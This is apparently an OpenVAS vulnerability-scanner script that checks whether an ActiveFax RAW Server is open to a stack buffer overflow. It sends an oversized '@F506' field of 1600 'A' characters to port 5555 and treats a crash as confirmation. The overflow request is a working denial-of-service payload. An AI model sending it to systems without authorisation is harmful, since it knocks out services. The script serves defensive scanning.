if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803169" );
	script_version( "$Revision: 11865 $" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $" );
	script_tag( name: "creation_date", value: "2013-02-11 17:46:45 +0530 (Mon, 11 Feb 2013)" );
	script_name( "ActiveFax RAW Server Multiple Buffer Overflow Vulnerabilities" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (c) 2013 Greenbone Networks GmbH" );
	script_family( "Buffer overflow" );
	script_dependencies( "find_service.sc" );
	script_require_ports( 515, 5555 );
	script_xref( name: "URL", value: "http://secunia.com/advisories/52096" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/24467" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/120109" );
	script_xref( name: "URL", value: "http://www.securelist.com/en/advisories/52096" );
	script_xref( name: "URL", value: "http://www.pwnag3.com/2013/02/actfax-raw-server-exploit.html" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to cause a denial of
  service." );
	script_tag( name: "affected", value: "ActiveFax Version 5.01 build 0232 and prior" );
	script_tag( name: "insight", value: "The flaws due to some boundary errors within the RAW server when processing
  the '@F000', '@F506', and '@F605' data fields can be exploited to cause
  stack-based buffer overflows by sending a specially crafted command to
  the server." );
	script_tag( name: "solution", value: "Upgrade to ActiveFax 5.01 beta or later." );
	script_tag( name: "summary", value: "The host is running ActiveFax RAW Server and is prone to multiple buffer
  overflow vulnerabilities." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "http://www.actfax.com/download/beta/actfax_setup_en.exe" );
	exit( 0 );
}
actlport = 515;
actrport = 5555;
if(!get_port_state( actlport ) && !get_port_state( actrport )){
	exit( 0 );
}
soc = open_sock_tcp( actlport );
if(!soc){
	exit( 0 );
}
send( socket: soc, data: raw_string( 0x04 ) + "OpenVASTest" + raw_string( 0x0a ) );
res = recv( socket: soc, length: 256 );
close( soc );
if(!ContainsString( res, "ActiveFax Server" )){
	exit( 0 );
}
if(!get_port_state( actrport )){
	exit( 0 );
}
soc = open_sock_tcp( actrport );
if(soc){
	data = NASLString( crap( length: 1600, data: "A" ) );
	req = "@F506 " + data + "@\r\nopenvas\r\n\r\n";
	send( socket: soc, data: req );
}
close( soc );
sleep( 2 );
soc = open_sock_tcp( actrport );
if(!soc){
	security_message( actrport );
	exit( 0 );
}

